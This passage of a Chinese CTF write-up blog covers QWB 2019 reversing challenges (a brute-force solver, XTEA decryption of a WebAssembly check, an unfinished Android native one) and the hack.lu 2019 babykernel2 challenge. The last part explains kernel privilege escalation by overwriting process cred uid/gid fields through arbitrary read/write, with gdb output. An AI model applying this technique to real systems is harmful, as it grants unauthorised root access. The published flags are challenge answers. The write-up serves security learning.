+<p>*（ 0x405018 + v19 ）&#x3D; （v19 + v2）^ (16843009 * v10 + *（ 0x405018 + v19 ）);</p>
+<p>++v19;</p>
+<p>}</p>
+<p>实际上就是input[i] &#x3D; (flag1+i) ^ (flag2 + input[i])</p>
+<style>.ewxzotofyxcd{zoom:50%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-12.png" class="ewxzotofyxcd" alt="img">
+
+<p>但是最后比较的步骤只需要关注第一个32位的部分就行了，所以除状态一外都不需要分析，因为只有两个未知量，所以用三个式子就能爆破出来。</p>
+<p>最后对比的字节为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x83EC8B55, 0xEC81F0E4, 0x00000278</span><br></pre></td></tr></table></figure>
+
+<p>所以爆破就行了：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> i0 = <span class="number">0x7AB29357</span>; <span class="type">int</span> o0 = <span class="number">0x83EC8B55</span>;</span><br><span class="line">    <span class="type">int</span> i1 = <span class="number">0xE98FBCC7</span>; <span class="type">int</span> o1 = <span class="number">0xEC81F0E4</span>;</span><br><span class="line">    <span class="type">int</span> i2 = <span class="number">0xFD0E0A2C</span>; <span class="type">int</span> o2 = <span class="number">0x00000278</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">-128</span>; j != <span class="number">128</span>; j++) &#123;</span><br><span class="line">        <span class="type">int</span> flag = o0 ^ ((<span class="number">0x01010101</span> * j) + i0);</span><br><span class="line">        <span class="keyword">if</span> (o1 == ((flag + <span class="number">1</span>) ^ (<span class="number">0x01010101</span> * j + i1))</span><br><span class="line">            &amp;&amp; o2 == ((flag + <span class="number">2</span>) ^ (<span class="number">0x01010101</span> * j + i2)))</span><br><span class="line">            &#123;cout &lt;&lt; flag &lt;&lt; <span class="string">&#x27; &#x27;</span> &lt;&lt; j &lt;&lt; endl;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%X%X\n&quot;</span>, flag, j);&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 前十个字符就是：1324223816</span></span><br></pre></td></tr></table></figure>
+
+<p>然后就是后16个字符，这里的检验函数4018A0用了SMC，需要解密一下，来到4018A0使用OD将其dump出来</p>
+<p>用ida打开，即可查看逻辑</p>
+<style>.ylxndykxziym{zoom:80%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-13.png" class="ylxndykxziym" alt="img">
+
+<p>查看逻辑，这里sub_401250明显是des算法，调用三次，分别是加密、解密、加密，即3DES算法</p>
+<style>.vytgweobgjqu{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-14.png" class="vytgweobgjqu" alt="img">
+
+<p>到底是不是，找个网站解密试试就知道了，发现可以解出来：</p>
+<style>.giymlrvkqhxa{zoom: 50%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-15.png" class="giymlrvkqhxa" alt="img">
+
+<p>最后放入程序验证，成功得到flag</p>
+<style>.qqzxjiqsojhn{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-16.png" class="qqzxjiqsojhn" alt="img">
+
+<p>flag{13242238160dcc509a6f75849b}</p>
+<h1 id="2019-re-webAssemble"><a href="#2019-re-webAssemble" class="headerlink" title="2019 re webAssemble"></a>2019 re webAssemble</h1><p>.wasm文件逆向管用套路：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/tools/wasm2c  webassembly.wasm -o web.c</span><br><span class="line">gcc -c web.c -o web.o</span><br></pre></td></tr></table></figure>
+
+<p>然后ida分析</p>
+<style>.jsttonvxiwjs{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-17.png" class="jsttonvxiwjs" alt="img">
+
+<p>main函数主要加密函数就这俩，f54有点复杂，先瞅瞅f15</p>
+<style>.rttdnhaudagu{zoom:80%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-18.png" class="rttdnhaudagu" alt="img">
+
+<style>.fidnitfjigls{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-19.png" class="fidnitfjigls" alt="img">
+
+<p>观察到魔数<code>9E3779B9</code>，然后循环了32次，应该是一个循环32次的XTEA算法</p>
+<p>该算法被调用了4次，四次算法密钥均为0</p>
+<p>那这样的话就找找后续的对比操作，找最后需对比的字符串</p>
+<style>.eouoprlbrvez{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-20.png" class="eouoprlbrvez" alt="img">
+
+<p>可以看到后面一堆赋值操作</p>
+<p>是用加密后的每一位分别异或一个值，然后取低8位，最后和前面一次算出来的值迭代相加。</p>
+<style>.wnvxyqkoufgs{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-21.png" class="wnvxyqkoufgs" alt="img">
+
+<p>然后最后判断是否相等</p>
+<p>那就假设每个式子的结果为0，那么所有式子就都成立，也就是说最后经算法加密后的值为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0x4e,0x6e,0xc7,0xea,</span><br><span class="line">0x8a,0x9d,0x70,0x89,//第1次xtea</span><br><span class="line"> </span><br><span class="line">0xeb,0xe2,0x45,0xd3,</span><br><span class="line">0xb8,0x4a,0xc0,0x73,//第2次xtea</span><br><span class="line"> </span><br><span class="line">0xb0,0x4a,0x40,0x71,</span><br><span class="line">0x37,0x34,0x88,0x42,//第3次xtea</span><br><span class="line"> </span><br><span class="line">0x32,0x88,0x80,0xd0,</span><br><span class="line">0x89,0xdb,0xa1,0x1e,//第4次xtea</span><br><span class="line"> </span><br><span class="line">0x35,0x38,0x39,0x31,</span><br><span class="line">0x33,0x7d//没有加密</span><br></pre></td></tr></table></figure>
+
+<p>先找个现成的算法解密一下：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, delta=<span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">        sum += delta;</span><br><span class="line">        v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], delta=<span class="number">0x9E3779B9</span>, sum=delta*num_rounds;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> data[]=&#123;</span><br><span class="line">        <span class="number">0x4e</span>,<span class="number">0x6e</span>,<span class="number">0xc7</span>,<span class="number">0xea</span>,</span><br><span class="line">        <span class="number">0x8a</span>,<span class="number">0x9d</span>,<span class="number">0x70</span>,<span class="number">0x89</span>,<span class="comment">//第1次xtea</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0xeb</span>,<span class="number">0xe2</span>,<span class="number">0x45</span>,<span class="number">0xd3</span>,</span><br><span class="line">        <span class="number">0xb8</span>,<span class="number">0x4a</span>,<span class="number">0xc0</span>,<span class="number">0x73</span>,<span class="comment">//第2次xtea</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0xb0</span>,<span class="number">0x4a</span>,<span class="number">0x40</span>,<span class="number">0x71</span>,</span><br><span class="line">        <span class="number">0x37</span>,<span class="number">0x34</span>,<span class="number">0x88</span>,<span class="number">0x42</span>,<span class="comment">//第3次xtea</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0x32</span>,<span class="number">0x88</span>,<span class="number">0x80</span>,<span class="number">0xd0</span>,</span><br><span class="line">        <span class="number">0x89</span>,<span class="number">0xdb</span>,<span class="number">0xa1</span>,<span class="number">0x1e</span>,<span class="comment">//第4次xtea</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0x35</span>,<span class="number">0x38</span>,<span class="number">0x39</span>,<span class="number">0x31</span>,</span><br><span class="line">        <span class="number">0x33</span>,<span class="number">0x7d</span><span class="comment">//没有加密</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">        <span class="built_in">decipher</span>(<span class="number">32</span>,(<span class="type">unsigned</span> <span class="type">int</span>*)(data+i*<span class="number">8</span>),key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;38fd643cc2c5200cc769b31ae7e58913&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>运行发现直接跑出来flag了：</p>
+<style>.ytokilfkdhpg{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-22.png" class="ytokilfkdhpg" alt="img">
+
+<style>.cijpvpgfmcpf{zoom: 50%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-23.png" class="cijpvpgfmcpf" alt="img">
+
+<style>.bdnenmsfdcnl{zoom:50%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-24.png" class="bdnenmsfdcnl" alt="img">
+
+<p>并且验证成功</p>
+<p>那就不需要再继续分析f54了，证明该函数和flag验证流程没关系</p>
+<h1 id="2019-re-BoringCrypto"><a href="#2019-re-BoringCrypto" class="headerlink" title="2019 re BoringCrypto"></a>2019 re BoringCrypto</h1><p>安卓native类型逆向，首先分析java中main函数，可知check函数使用的是jni的静态注册方法，因此应该比较容易找到，那么就找到native.so然后用ida打开：</p>
+<style>.wqxrnfnffvqc{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-25.png" class="wqxrnfnffvqc" alt="img">
+
+<style>.imjjrsrqiltb{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-26.png" class="imjjrsrqiltb" alt="img">
+
+<p>这个函数反汇编之后都有将近5000行，太复杂，看不太懂qaq</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/11/22/qwb2019-re/" data-id="cuid5Qx_8civHNxywAYbGQ9N5" data-title="qwb2019-re" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2019hacklu" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/11/09/2019hacklu/" class="article-date">
+  <time class="dt-published" datetime="2019-11-09T03:07:10.000Z" itemprop="datePublished">2019-11-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2019/11/09/2019hacklu/">hack.lu 2019</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="babykernel2"><a href="#babykernel2" class="headerlink" title="babykernel2"></a>babykernel2</h2><p>直接给了AAW和AAR</p>
+<p>Each process has a struct called task_struct which is stored in kernel space, this structure contains a lot of information related to the process like scheduling information, memory descriptor(mm_struct) which has information about programs memory, parent process, linked list of child process, next task and more importantly it has a pointer to process privileges which is a structure named cred. So our task is to overwrite the identifiers( uid, gid, group id, fsuid, fsgid) to 0 which is nothing but a process with root privileges.</p>
+<ol>
+<li>Read <code>current_task</code> ptr address based on provided <code>System.map</code></li>
+<li>Get <code>cred* cred</code> pointer</li>
+<li>Overwrite <code>cred-&gt;fsuid</code> and <code>cred-&gt;fsguid</code></li>
+<li>Read <code>/flag</code></li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> ptype /o struct cred</span><br><span class="line">/* offset    |  size */  <span class="built_in">type</span> = struct cred &#123;</span><br><span class="line">/*    0      |     4 */    atomic_t usage;</span><br><span class="line">/*    4      |     4 */    kuid_t uid;</span><br><span class="line">/*    8      |     4 */    kgid_t gid;</span><br><span class="line">/*   12      |     4 */    kuid_t suid;</span><br><span class="line">/*   16      |     4 */    kgid_t sgid;</span><br><span class="line">/*   20      |     4 */    kuid_t euid;</span><br><span class="line">/*   24      |     4 */    kgid_t egid;</span><br><span class="line">/*   28      |     4 */    kuid_t fsuid;</span><br><span class="line">/*   32      |     4 */    kgid_t fsgid;</span><br><span class="line">/*   36      |     4 */    unsigned int securebits;</span><br><span class="line">/*   40      |     8 */    kernel_cap_t cap_inheritable;</span><br><span class="line">/*   48      |     8 */    kernel_cap_t cap_permitted;</span><br><span class="line">/*   56      |     8 */    kernel_cap_t cap_effective;</span><br><span class="line">/*   64      |     8 */    kernel_cap_t cap_bset;</span><br><span class="line">/*   72      |     8 */    kernel_cap_t cap_ambient;</span><br><span class="line">/*   80      |     8 */    struct user_struct *user;</span><br><span class="line">/*   88      |     8 */    struct user_namespace *user_ns;</span><br><span class="line">/*   96      |     8 */    struct group_info *group_info;</span><br><span class="line">/*  104      |    16 */    union &#123;</span><br><span class="line">/*                 4 */        int non_rcu;</span><br><span class="line">/*                16 */        struct callback_head &#123;</span><br><span class="line">/*  104      |     8 */            struct callback_head *next;</span><br><span class="line">/*  112      |     8 */            void (*func)(struct callback_head *);</span><br><span class="line"></span><br><span class="line">                                   /* total size (bytes):   16 */</span><br><span class="line">                               &#125; rcu;</span><br><span class="line"></span><br><span class="line">                               /* total size (bytes):   16 */</span><br><span class="line">                           &#125;;</span><br><span class="line"></span><br><span class="line">                           /* total size (bytes):  120 */</span><br><span class="line">                         &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>可以通过<code>init_task</code>也就是0号进程的前向task_list指针找到<code>current_task</code>，可以通过泄露<code>comm</code>进程名来确定</p>
+<p>因为通过Ctrl+C在gdb中断下的是在Init的swapper，即0号进程，通过tasks指针来找到最后一个运行的进程</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; p current_task.tasks</span><br><span class="line"><span class="variable">$18</span> = &#123;</span><br><span class="line">  next = 0xffff888000028210,</span><br><span class="line">  prev = 0xffff888003375990</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当然应该最简单的是通过<code>current_task</code>来，在运行的client_kernel.ko中下断，此时内核的current_task即为当前进程并查看cred如下：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; p current_task</span><br><span class="line">$<span class="number">32</span> = (<span class="keyword">struct</span> task_struct *) <span class="number">0xffff888003373480</span></span><br><span class="line">gef&gt; p $<span class="number">32.</span>comm</span><br><span class="line">$<span class="number">33</span> =   <span class="string">&quot;client_kernel_b&quot;</span></span><br><span class="line">gef&gt; p $<span class="number">32.</span>cred</span><br><span class="line">$<span class="number">34</span> = (<span class="type">const</span> <span class="keyword">struct</span> cred *) <span class="number">0xffff888003384700</span></span><br><span class="line">gef&gt; p *$<span class="number">34</span></span><br><span class="line">$<span class="number">35</span> = &#123;</span><br><span class="line">  usage = &#123;</span><br><span class="line">    counter = <span class="number">0x3</span></span><br><span class="line">  &#125;,</span><br><span class="line">  uid = &#123;</span><br><span class="line">    val = <span class="number">0x3e8</span></span><br><span class="line">  &#125;,</span><br><span class="line">  gid = &#123;</span><br><span class="line">    val = <span class="number">0x3e8</span></span><br><span class="line">  &#125;,</span><br><span class="line">  suid = &#123;</span><br><span class="line">    val = <span class="number">0x3e8</span></span><br><span class="line">  &#125;,</span><br><span class="line">  sgid = &#123;</span><br><span class="line">    val = <span class="number">0x3e8</span></span><br><span class="line">  &#125;,</span><br><span class="line">  euid = &#123;</span><br><span class="line">    val = <span class="number">0x3e8</span></span><br><span class="line">  &#125;,</span><br><span class="line">  egid = &#123;</span><br><span class="line">    val = <span class="number">0x3e8</span></span><br><span class="line">  &#125;,</span><br><span class="line">  fsuid = &#123;</span><br><span class="line">    val = <span class="number">0x3e8</span></span><br><span class="line">  &#125;,</span><br><span class="line">  fsgid = &#123;</span><br><span class="line">    val = <span class="number">0x3e8</span></span><br><span class="line">  &#125;,</span><br><span class="line">  securebits = <span class="number">0x0</span>,</span><br><span class="line">  cap_inheritable = &#123;</span><br><span class="line">    cap =       &#123;[<span class="number">0x0</span>] = <span class="number">0x0</span>,</span><br><span class="line">          [<span class="number">0x1</span>] = <span class="number">0x0</span>&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  cap_permitted = &#123;</span><br><span class="line">    cap =       &#123;[<span class="number">0x0</span>] = <span class="number">0x0</span>,</span><br><span class="line">      [<span class="number">0x1</span>] = <span class="number">0x0</span>&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  cap_effective = &#123;</span><br><span class="line">    cap =       &#123;[<span class="number">0x0</span>] = <span class="number">0x0</span>,</span><br><span class="line">      [<span class="number">0x1</span>] = <span class="number">0x0</span>&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  cap_bset = &#123;</span><br><span class="line">    cap =       &#123;[<span class="number">0x0</span>] = <span class="number">0xffffffff</span>,</span><br><span class="line">      [<span class="number">0x1</span>] = <span class="number">0x3f</span>&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  cap_ambient = &#123;</span><br><span class="line">    cap =       &#123;[<span class="number">0x0</span>] = <span class="number">0x0</span>,</span><br><span class="line">      [<span class="number">0x1</span>] = <span class="number">0x0</span>&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  user = <span class="number">0xffff888003380000</span>,</span><br><span class="line">  user_ns = <span class="number">0xffffffff8183e5c0</span> &lt;init_user_ns&gt;,</span><br><span class="line">  group_info = <span class="number">0xffff88800018d2c0</span>,</span><br><span class="line">  &#123;</span><br><span class="line">    non_rcu = <span class="number">0x0</span>,</span><br><span class="line">    rcu = &#123;</span><br><span class="line">      next = <span class="number">0x0</span>,</span><br><span class="line">      func = <span class="number">0x0</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可见cred的数据结构：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; ptype <span class="class"><span class="keyword">struct</span> <span class="title">cred</span></span></span><br><span class="line"><span class="class"><span class="title">type</span> =</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span> usage;</span><br><span class="line">    <span class="type">kuid_t</span> uid;</span><br><span class="line">    <span class="type">kgid_t</span> gid;</span><br><span class="line">    <span class="type">kuid_t</span> suid;</span><br><span class="line">    <span class="type">kgid_t</span> sgid;</span><br><span class="line">    <span class="type">kuid_t</span> euid;</span><br><span class="line">    <span class="type">kgid_t</span> egid;</span><br><span class="line">    <span class="type">kuid_t</span> fsuid;</span><br><span class="line">    <span class="type">kgid_t</span> fsgid;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> securebits;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_inheritable;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_permitted;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_effective;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_bset;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_ambient;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">int</span> non_rcu;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">gef&gt; ptype /o <span class="class"><span class="keyword">struct</span> <span class="title">cred</span></span></span><br><span class="line"><span class="class">/* <span class="title">offset</span>    |  <span class="title">size</span> */  <span class="title">type</span> =</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line"><span class="comment">/*    0      |     4 */</span>    <span class="type">atomic_t</span> usage;</span><br><span class="line"><span class="comment">/*    4      |     4 */</span>    <span class="type">kuid_t</span> uid;</span><br><span class="line"><span class="comment">/*    8      |     4 */</span>    <span class="type">kgid_t</span> gid;</span><br><span class="line"><span class="comment">/*   12      |     4 */</span>    <span class="type">kuid_t</span> suid;</span><br><span class="line"><span class="comment">/*   16      |     4 */</span>    <span class="type">kgid_t</span> sgid;</span><br><span class="line"><span class="comment">/*   20      |     4 */</span>    <span class="type">kuid_t</span> euid;</span><br><span class="line"><span class="comment">/*   24      |     4 */</span>    <span class="type">kgid_t</span> egid;</span><br><span class="line"><span class="comment">/*   28      |     4 */</span>    <span class="type">kuid_t</span> fsuid;</span><br><span class="line"><span class="comment">/*   32      |     4 */</span>    <span class="type">kgid_t</span> fsgid;</span><br></pre></td></tr></table></figure>
+
+<p>就根据offset从4byte-20bytes都更改为0，即可实现改进程的提权</p>
